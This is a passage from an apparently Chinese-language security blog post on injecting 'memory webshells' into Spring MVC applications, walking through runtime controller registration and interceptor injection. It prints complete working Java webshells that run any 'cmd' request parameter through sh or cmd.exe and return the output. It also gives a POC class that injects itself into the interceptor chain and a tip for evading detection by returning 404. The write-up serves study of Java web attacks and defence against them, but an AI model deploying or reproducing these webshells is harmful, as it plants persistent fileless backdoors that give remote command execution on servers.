+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">package org.example.springmvc;</span><br><span class="line"></span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line">import org.springframework.web.context.WebApplicationContext;</span><br><span class="line">import org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line">import org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line">import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line">import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">public class InjectController &#123;</span><br><span class="line">    @RequestMapping(&quot;/inject&quot;)</span><br><span class="line">    public String inject() throws Exception&#123;</span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line"></span><br><span class="line">        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        Method method = InjectedController.class.getMethod(&quot;cmd&quot;);</span><br><span class="line"></span><br><span class="line">        PatternsRequestCondition url = new PatternsRequestCondition(&quot;/evilcontroller&quot;);</span><br><span class="line"></span><br><span class="line">        RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();</span><br><span class="line"></span><br><span class="line">        RequestMappingInfo info = new RequestMappingInfo(url, condition, null, null, null, null, null);</span><br><span class="line"></span><br><span class="line">        InjectedController injectedController = new InjectedController();</span><br><span class="line"></span><br><span class="line">        requestMappingHandlerMapping.registerMapping(info, injectedController, method);</span><br><span class="line"></span><br><span class="line">        return &quot;Inject done&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RestController</span><br><span class="line">    public class InjectedController &#123;</span><br><span class="line">        public InjectedController()&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        public void cmd() throws Exception &#123;</span><br><span class="line">            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">            if (request.getParameter(&quot;cmd&quot;) != null) &#123;</span><br><span class="line">                boolean isLinux = true;</span><br><span class="line">                String osTyp = System.getProperty(&quot;os.name&quot;);</span><br><span class="line">                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;</span><br><span class="line">                    isLinux = false;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, request.getParameter(&quot;cmd&quot;)&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, request.getParameter(&quot;cmd&quot;)&#125;;</span><br><span class="line">                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">                String output = s.hasNext() ? s.next() : &quot;&quot;;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC20.png" alt="img"></p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC21.png" alt="img"></p>
+<h5 id="detectHandlerMethods直接注册"><a href="#detectHandlerMethods直接注册" class="headerlink" title="detectHandlerMethods直接注册"></a>detectHandlerMethods直接注册</h5><p>上面指出：在detectHandlerMethods中，用getMappingForMethod创建RequestMappingInfo</p>
+<p>该方法接收handler参数，就能寻找到bean并注册controller</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//1.在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span><br><span class="line">context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;org.example.springmvc.InjectedController&quot;).newInstance());</span><br><span class="line">// 2. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br><span class="line">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);</span><br><span class="line">// 3. 反射获得 detectHandlerMethods Method</span><br><span class="line">java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(&quot;detectHandlerMethods&quot;, Object.class);</span><br><span class="line">m1.setAccessible(true);</span><br><span class="line">//4.将 dynamicController 注册到 handlerMap 中</span><br><span class="line">m1.invoke(requestMappingHandlerMapping, &quot;dynamicController&quot;);</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用registerHandler"><a href="#利用registerHandler" class="headerlink" title="利用registerHandler"></a>利用registerHandler</h5><p>上面的方法适用于spring3.1后RequestMappingHandlerMapping为映射器。当用DefaultAnnotationHandlerMapping为映射器时。该类顶层父类的registerHandler接收urlPath参数和handler参数来注册controller。不过不常用了，贴一下利用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span><br><span class="line">context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;org.example.springmvc.InjectedController&quot;).newInstance());</span><br><span class="line">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span><br><span class="line">org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);</span><br><span class="line">// 3. 反射获得 registerHandler Method</span><br><span class="line">java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(&quot;registerHandler&quot;, String.class, Object.class);</span><br><span class="line">m1.setAccessible(true);</span><br><span class="line">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span><br><span class="line">m1.invoke(dh, &quot;/favicon&quot;, &quot;dynamicController&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>还可以加个else不带参数时返回404状态码，减少被检测到的概率</p>
+<h2 id="Interceptor拦截器内存马构造"><a href="#Interceptor拦截器内存马构造" class="headerlink" title="Interceptor拦截器内存马构造"></a>Interceptor拦截器内存马构造</h2><p>Interceptor和Tomcat和Filter过滤器很类似。区别如下：</p>
+<ol>
+<li>Interceptor基于反射，Filter基于函数回调</li>
+<li>Interceptor不依赖servlet容器</li>
+<li>Interceptor只能对action请求有用</li>
+<li>Interceptor可以访问action上下文，栈里的对象。Filter不能</li>
+<li>action生命周期中，Interceptor可以被多次调用，Filter只在容器初始化时调用一次</li>
+<li>Interceptor可以获取IOC容器中的bean，Filter不行</li>
+</ol>
+<p>由以上区别，Interceptor的应用和过滤器也就不同，Interceptor用来做日志记录，过滤器用来过滤非法操作</p>
+<h4 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h4><p>DispatcherServlet.doDispatch中，进行了getHandler，持续跟进发现最终调用的是AbstractHandlerMapping#getHandler()</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC22.png" alt="img"></p>
+<p>该方法中调用了getHandlerExecutionChain()，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC23.png" alt="img"></p>
+<p>该方法从adaptedInterceptors中把符合的拦截器添加到chain里。adaptedInterceptors就存放了全部拦截器，返回到DispatcherServlet#doDispatch()，到这</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC24.png" alt="img"></p>
+<p>而且可以看到applyPreHandle后面就是ha.handle()，执行controller，所以说Interceptors是在controller之前执行的，跟进applyPreHandle方法，调用了interceptor.preHandle方法，这里的原理就是我们自定义一个interceptor，然后修改它的preHandle方法为恶意代码即可</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC25.png" alt="img"></p>
+<h3 id="1-获取RequestMappingHandlerMapping"><a href="#1-获取RequestMappingHandlerMapping" class="headerlink" title="1. 获取RequestMappingHandlerMapping"></a>1. 获取RequestMappingHandlerMapping</h3><p>因为是在AbstractHandlerMapping类中，用addInterceptor向拦截器chain中添加的。该类是抽象类，可以获取其实现类RequestMappingHandlerMapping。一样的，前面提了四种方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line"></span><br><span class="line">RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-反射获取adaptedInterceptors"><a href="#2-反射获取adaptedInterceptors" class="headerlink" title="2.反射获取adaptedInterceptors"></a>2.反射获取adaptedInterceptors</h3><p>获取adaptedInterceptors，private属性，使用反射。并且传入RequestMappingHandlerMapping初始化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Field field = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        field = RequestMappingHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);</span><br><span class="line">    &#125; catch (NoSuchFieldException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    field.setAccessible(true);</span><br><span class="line">    List&lt;HandlerInterceptor&gt; adaptInterceptors = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);</span><br><span class="line">    &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-添加恶意Interceptors"><a href="#3-添加恶意Interceptors" class="headerlink" title="3.添加恶意Interceptors"></a>3.添加恶意Interceptors</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adaptInterceptors.add(new InjectEvilInterceptor(&quot;a&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>恶意Interceptor:需要实现HandlerInterceptor接口，通过重写preHandle进行RCE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public class InjectInterceptor implements HandlerInterceptor &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;</span><br><span class="line">        if (request.getParameter(&quot;cmd&quot;) != null) &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                boolean isLinux = true;</span><br><span class="line">                String osTyp = System.getProperty(&quot;os.name&quot;);</span><br><span class="line">                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;</span><br><span class="line">                    isLinux = false;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, request.getParameter(&quot;cmd&quot;)&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, request.getParameter(&quot;cmd&quot;)&#125;;</span><br><span class="line">                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">                String output = s.hasNext() ? s.next() : &quot;&quot;;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123;</span><br><span class="line">        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123;</span><br><span class="line">        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h3><p>过滤器和controller可以直接使用@RequestMapping注解进行URL映射。拦截器Interceptor需要手动编写一个Config添加进去，或者直接修改配置文件spingmvc.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;mvc:interceptors&gt;</span><br><span class="line">        &lt;mvc:interceptor&gt;</span><br><span class="line">            &lt;mvc:mapping path=&quot;/**&quot;/&gt;</span><br><span class="line">            &lt;bean class=&quot;org.example.InjectInterceptor&quot;&gt;&lt;/bean&gt;</span><br><span class="line">        &lt;/mvc:interceptor&gt;</span><br><span class="line">    &lt;/mvc:interceptors&gt;</span><br></pre></td></tr></table></figure>
+
+<p>POC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">package org.example.springmvc;</span><br><span class="line"></span><br><span class="line">import org.springframework.web.context.WebApplicationContext;</span><br><span class="line">import org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line">import org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line">import org.springframework.web.servlet.ModelAndView;</span><br><span class="line">import org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class InjectInterceptor implements HandlerInterceptor &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        Field field = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            field = AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);</span><br><span class="line">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        List&lt;HandlerInterceptor&gt; adaptInterceptors = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);</span><br><span class="line">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        InjectInterceptor evilInterceptor = new InjectInterceptor();</span><br><span class="line">        adaptInterceptors.add(evilInterceptor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;</span><br><span class="line">        if (request.getParameter(&quot;cmd&quot;) != null) &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                boolean isLinux = true;</span><br><span class="line">                String osTyp = System.getProperty(&quot;os.name&quot;);</span><br><span class="line">                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;</span><br><span class="line">                    isLinux = false;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, request.getParameter(&quot;cmd&quot;)&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, request.getParameter(&quot;cmd&quot;)&#125;;</span><br><span class="line">                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">                String output = s.hasNext() ? s.next() : &quot;&quot;;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123;</span><br><span class="line">        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123;</span><br><span class="line">        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>新建一个controller触发拦截器，作为入口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package org.example.springmvc;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">@RequestMapping(&quot;/InjectInterceptor&quot;)</span><br><span class="line">public class EvilController &#123;</span><br><span class="line">    @GetMapping</span><br><span class="line">    public void index(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;org.example.springmvc.InjectInterceptor&quot;);</span><br><span class="line">            response.getWriter().println(&quot;Inject done!&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC26.png" alt="img"></p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC27.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/08/10/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/"> Log4j2的JNDI注入漏洞（CVE-2021-44228）</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/08/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/">红日靶场-1 </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/10/05/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="prev" title="常见webshell流量分析">
+      <i class="fa fa-chevron-left"></i> 常见webshell流量分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/10/05/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/" rel="next" title="Log4j2的JNDI注入漏洞（CVE-2021-44228）">
+      Log4j2的JNDI注入漏洞（CVE-2021-44228） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#controller"><span class="nav-number">1.0.1.</span> <span class="nav-text">controller</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ApplicationContext"><span class="nav-number">1.0.2.</span> <span class="nav-text">ApplicationContext</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ContextLoaderListener"><span class="nav-number">1.0.3.</span> <span class="nav-text">ContextLoaderListener</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">调试分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#controller%E7%9A%84%E6%B3%A8%E5%86%8C"><span class="nav-number">3.0.1.</span> <span class="nav-text">controller的注册</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RequestMappingHandlerMapping%E5%88%86%E6%9E%90"><span class="nav-number">3.0.2.</span> <span class="nav-text">RequestMappingHandlerMapping分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Controller%E5%86%85%E5%AD%98%E9%A9%AC%E6%9E%84%E9%80%A0"><span class="nav-number">4.</span> <span class="nav-text">Controller内存马构造</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" 